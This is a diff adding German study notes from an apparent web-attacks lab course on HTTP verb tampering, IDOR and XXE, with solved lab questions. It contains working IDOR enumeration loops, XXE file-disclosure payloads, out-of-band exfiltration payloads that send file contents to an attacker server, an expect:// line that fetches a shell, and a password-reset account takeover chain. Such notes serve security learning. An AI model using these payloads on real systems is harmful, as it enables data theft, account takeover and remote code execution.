@@ -1,0 +1,324 @@
+Web Attacks
+Introduction to Web Attacks:
+- Immer mehr Anwendungen werden als Webanwendugnen entwickelt
+- Dies vergroessert die Angriffsflaeche von Unternehmen
+
+- Web Attacks:
+	- HTTP Verb Tampering:
+		- Wir koennen die HTTP Methode aendern um den Authorisierungs Mechanismus zu umgehen
+	- Inseure Direct Object Reference(IDOR):
+		- Zaehlt zu den haeufigsten Schwachstellen
+		- Passiert wenn Benutzereingabe direkt Zugriff auf Objekte gewaehrt 
+	- XML External Entity (XXE) Injection:
+		- Wenn Anwendungen alte XML Bibliotheken verwenden koennen wir mit XML Daten diese Schwachstellen diese ausnutzen
+
+###############################################################################################
+HTTP Verb Tampering:
+1. Intro to HTTP Verb Tampering:
+- HTTP Verb Tampering:
+	- HTTP hat 9 verschiedene Methoden die von Web-Servern akzeptiert werden koennen
+	- Wenn der Webserver nicht korrrekt konfiguriert ist koennen Methoden dafuer verwendet werden um Dateien auf den Webserver zu schreiben
+
+2. Bypassing Basic Authentication:
+- Die Angriffsmethode ist sehr einfach wir muessen nur die HTTP Methode aendern
+- Der erste Typ ist eine Insecure Web Server Configurations Schwachstelle 
+
+- Identify:
+	- Wenn wir einen 401 Unauthorizes Status bekommen koennen wir versuchen auf den Ordener zuzugreifen
+
+- Exploit:
+	- In Burp Suite koennen wir mit Change request method die HTTP Methode wechseln
+	- Mit curl koennen wir die verfuegbaren HTTP Methoden sehen
+	- curl -i -X OPTIONS http://SERVER_IP:PORT/
+
+3. Bypassing Security Filters:
+- Manchmal werden nicht alle HTTP Methoden abgefangen hierbei koenenn wir einen Filter umgehen in dem wir die HTTP Methode zu wechseln
+
+- Question:
+	- Input file; cp /flag.txt ./
+	- OPTIONS HTTP Methode
+
+###############################################################################################
+Insecure Direct Object References(IDOR):
+1. Intro to IDOR:
+- IDOR Schwachstellen treten auf wenn Web Anwendungen direkten Zugriff auf Objekte haben wie eien Datenbank oder eine Datei
+- Wenn keine Zugriffskontrolle auf dem Backend existiert koennen wir Zugriff auf Objekte erhalten
+
+2. Identifying IDORs:
+- Wir muessen als allererstes einen direkten Zugriff auf Dateien/Objekte finden wie ?uid=1 oder ?filename=file_1.pdf
+
+- AJAX Calls:
+	- Manchmal werden AJAX Calls oder JavaScript Frameworks im Front-End gespeichert
+	- Hier koenenn wir ebenfalls Parameter verwenden die unbenutzt sind
+
+- Understand Hashing/Encoding:
+	- Manchmal wird der Parameterinput gehashed oder encoded
+	- Meistens wird mit base64 encoded
+
+- Compare User Roles:
+	- Wir koennen die Request von unterschiedlichen Usern vergleichen und sehen welche Parameter sich bei aneren Usern aendern
+
+3. Mass IDOR Enumeration:
+- Mass Enumeration:
+	- Mit Burp Suite koennen wir mit dem Intruder alle Dateien von der Webseite runterholen
+	- Im Terminal koennen wir uns die Dateien anzeigen lassen 
+	- curl -s "http://SERVER_IP:PORT/documents.php?uid=1" | grep <"HTML Element">
+	- curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/<Verzeichnissname>.*?.<Dateiendung>"
+
+- Question:
+for ((i=1 ; i<=20 ; i++ )); do 
+	curl -X POST http://134.122.101.249:32536/documents.php -d "uid=${i}" | grep "documents"
+done | grep "flag"
+- http://134.122.101.249:32536/documents/flag_11dfa168ac8eb2958e38425728623c98.txt
+
+4. Bypassing Ecoded Referces:
+- Wenn die uebertragenen Daten encoded sind koennen wir diese ebenso verwenden
+
+- Function Disclosure:
+	- Manchmal fuehren Developer sensitive Funktionen auf dem Front-End aus
+	- Zu sensitiven Funktion gehoeren Funktionen mit denen der Input encoded wird
+
+- Mass Enumeration:
+	- Wir koenne eine Liste von Hashes auflisten und dann ein curl Befehl mit dem Hash als Daten auszufuehren
+	- Mit diesem einfachen Script senden wir 10 Hashes an die Webseite
+	for i in {1..10}; do
+    	for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
+        	curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
+    	done
+	done
+
+- Question:
+- sudo apt-get install gridsite-clients
+- Base64 Encoding -> URL Encoding
+for i in {1..20}; do
+	for hash in $(echo -n $i | base64 -w 0); do
+    	curl -sOJ -X GET http://178.62.74.235:31085/download.php?contract=$(urlencode "$hash");
+	done
+done
+
+5. IDOR in Isecure APIs:
+- IDOR Schwachstellen existieren nicht nur beim Zugriff auf Ressourcen
+- IDOR Schwachstellen koennen auch in Zusammenhang mit APIs existieren
+- Wir koennen die API verwenden um Passwoerter anderer User zu aendern usw
+
+- Identifying Insecure APIs:
+	- Wenn wir API Anfragen abfangen koennen wir Parameter aendern
+
+6. Chaining IDOR Vulnerabilites:
+- Meistens werden bei einem API Aufruf eine Rolle gesetzt
+- Wir koennen verschiedene IDOR Schwachstellen verknuepfen
+
+- Question:
+- Admin UID Bekommen und dann in der PUT Anfrage die Email aendern 
+for i in {1..50}; do
+	curl -X GET http://165.227.232.214:31895/profile/api.php/profile/$i;
+done
+
+uid=10;
+
+{"uid":"10","uuid":"bfd92386a1b48076792e68b596846499","role":"staff_admin","full_name":"admin","email":"admin@employees.htb","about":"Never gonna give you up, Never gonna let you down"}
+
+###############################################################################################
+XML External Entity (XXE) Injection:
+1. Intro to XXE:
+- Die XML External Entity(XXE) Injection Schwachstelle treten auf wenn der User XML Daten eingeben kann und das Backend noch ale XML Bibliotheken verwendet
+
+- XML:
+	- Extensible Markup Language(XML) ist eine Sprache um Daten flexibel zu transferrieren und zu speichern
+	- Es gibt viele Elemente in einem XML Dokument wie:
+		- Tag: Keys von einem Dokument wie <Datum>
+		- Entity: XML Variablen wie &lt;
+		- Element: Speichert einen Wert wie <date>01-01-2022</date>
+		- usw
+
+- XML DTD:
+	- XML Document Type Definition(DTD) erlaubt Validierung von XML Dokumenten mit einer vordefinierten Dokumentenstruktur
+	- Es gibt eine vordefinierte Dokumentenstruktur mit dem die Usereingabe validiert wird
+
+2. Local File Disclosure:
+- Wenn wir neue Entitaeten zu einer XML struktur zufuefen koennen kann es moeglich sein lokale Dateien zu referenzieren
+
+- Identifying:
+	- Wir koennen diese Schwachstellen meistens bei einem Form finden in dem mehrere Daten eingegeben koennen
+	- Wir koennen eine neues Element anlegen und der ausgegebenen Variable zuschreiben
+	- Mit &<Variable>; koennen wir die Variable in das ausgegebenen Feld setzen
+	- Wenn das funktioniert liegt ein Schwachstelle fuer XXE vor
+	- Manchmal ist das Format von HTTP Anfragen in JSON Format und muessen erst in XML uebersetzt werden
+
+- Reading Sensitive Files:
+	- Wir koennen mit einen XML Eintrag vornehmen die mit SYSTEM auf das lokale Dateisystem zugreift
+	- <!DOCTYPE email [
+  		<!ENTITY company SYSTEM "file:///etc/passwd">
+	]>
+
+- Reading Soure Code:
+	- Wir koennen ebenfalls den Source Code der Webseite ausgeben und diesen studieren
+	- Wenn file.. nicht funktioniert koennen wir ebenfalls einen php filter verwenden
+
+- Remote Code Execution with XXE:
+	- Es ist eventuell moeglich eine reverse Shell zu bekommen
+	- Wir koennen mit "expect://curl$IFS-O$IFS'OUR_IP/shell.php'"
+
+- Question:
+<!DOCTYPE email [
+	<!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=connection.php">
+]>
+
+3. Advanced File Disclosure:
+- Manche Format sind nicht lesbar durch ein XXE
+
+- Advanced Exfiltration with CDATA:
+	- Mit PHP Filtern koennen wir PHP Code ausfuehren und das XML Format beibehalten
+	- Wir koennen ausserdem eine Datei Referenz mit einem CDATA Tag einpacken
+	- <!DOCTYPE email [
+		  <!ENTITY begin "<![CDATA[">
+		  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
+		  <!ENTITY end "]]>">
+		  <!ENTITY joined "&begin;&file;&end;">
+	  ]>
+	- Mit &joines koennen wir die Strings zusammenlegen
+	- <!ENTITY joined "%begin;%file;%end;"> wird nicht funktionieren weil interne und externe Entities nicht miteinander gejoined werden koennen
+	- Auf dem Attackhost koennen wir einen joined Befehl anlegen mit 
+	- echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
+	- python3 -m http.server 8000
+	<!DOCTYPE email [
+		<!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
+		<!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
+		<!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
+		<!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
+		%xxe;
+	]>
+
+- Error Bases XXE:
+	- Manchmal findet keine Ausgabe vom XML Input statt deswegen muessen wir blind arbeiten
+	- Manchmal werden Errors in der /error Section ausgegeben
+
+- Question:
+	- echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
+	- python3 -m http.server 8000
+	
+	<?xml version="1.0" encoding="UTF-8"?>
+	<!DOCTYPE email [
+	  <!ENTITY % begin "<![CDATA[">
+	  <!ENTITY % file SYSTEM "file:///flag.php">
+	  <!ENTITY % end "]]>">
+	  <!ENTITY % xxe SYSTEM "http://10.10.15.7:8000/xxe.dtd">
+	  %xxe;
+	]>
+	<root>
+	<name></name>
+	<tel></tel>
+	<email>&joined;|</email>
+	<message></message>
+	</root>
+
+4. Blind Data Exfiltration:
+- Wenn wir fuer unserem Input keinen Output bekommen koennen handelt es sich um eine Blind XXE Schwachstelle
+
+- Out-of-band Data Exfiltration:
+	- Wenn die Webanwendung nichts ausgibt koennen wir die Anfragen zu unserem Webserver umleiten um sie dann aufzulisten
+	- Dafuer benoetigen wir zwei Parameter einen um die Datei vom Server abzurufen und einen um die Datei an unseren Webserver weiterzuleiten
+		- <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+		- <!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
+	- Hier koennen wir Content Daten Decoden:
+		- <?php
+			if(isset($_GET['content'])){
+			    error_log("\n\n" . base64_decode($_GET['content']));
+			}
+		?>
+		- php -S 0.0.0.0:8000
+
+- Automated OOB Exfiltration:
+	- Wir koennen eine blinde XXE Daten Exiltration mit Tools automatisieren
+	- XEEinjector ist ein Tool hierfuer
+	- Wir koennen den HTTP Request von Burp in eine Datei kopieren mit der ersten Zeile von den XML Daten mit XXEINJECT
+	- --host/--httpport ist die OP und der Port Flags
+	- --file Die Datei die wir zum weiterleiten benoetigen
+		- <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+		- <!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
+	- --path ist die Datei die wir lesen wollen
+		- ruby XXEinjector.rb --host=127.0.0.1 --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
+
+- Question:
+- xxe.dtd
+	- <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/327a6c4304ad5938eaf0efb6cc3e53dc.php">
+	- <!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE email [ 
+  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
+  %remote;
+  %oob;
+]>
+<root>&content;</root>
+
+###############################################################################################
+Web Attacks - Skills Assessment:
+- Question: Try to escalate your privileges and exploit different vulnerabilities to read the flag at '/flag.php'.
+- 178.62.74.235
+
+
+for ((i=1 ; i<=10 ; i++ )); do 
+	curl -X GET http://178.62.74.235:31713/api.php/user/${id} -b "PHPSESSID=9lloa5kkq22qtngcbam06893rr; uid=${id}";
+done
+
+GET /api.php/user/52 HTTP/1.1
+Host: 178.62.74.235:31713
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
+Accept: */*
+Referer: http://178.62.74.235:31713/profile.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+Cookie: PHPSESSID=9lloa5kkq22qtngcbam06893rr; uid=74
+Connection: close
+
+{"uid":"52","username":"a.corrales","full_name":"Amor Corrales","company":"Administrator"}
+
+
+
+GET /api.php/token/52 HTTP/1.1
+Host: 178.62.74.235:31713
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
+Accept: */*
+Referer: http://178.62.74.235:31713/settings.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+Cookie: PHPSESSID=9lloa5kkq22qtngcbam06893rr; uid=74
+Connection: close
+
+{"token":"e51a85fa-17ac-11ec-8e51-e78234eb7b0c"}
+
+
+GET /reset.php?uid=52&token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&password=123 HTTP/1.1
+Host: 178.62.74.235:31713
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
+Accept: */*
+Origin: http://178.62.74.235:31713
+Referer: http://178.62.74.235:31713/settings.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+Cookie: PHPSESSID=9lloa5kkq22qtngcbam06893rr; uid=74
+Connection: close
+
+
+POST /addEvent.php HTTP/1.1
+Host: 178.62.74.235:31713
+Content-Length: 150
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
+Content-Type: text/plain;charset=UTF-8
+Accept: */*
+Origin: http://178.62.74.235:31713
+Referer: http://178.62.74.235:31713/event.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+Cookie: PHPSESSID=9lloa5kkq22qtngcbam06893rr; uid=52
+Connection: close
+
+<!DOCTYPE email [
+  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">
+]>
+<root>
+<name>&company;</name>
+<details></details>
+<date></date>
+</root>
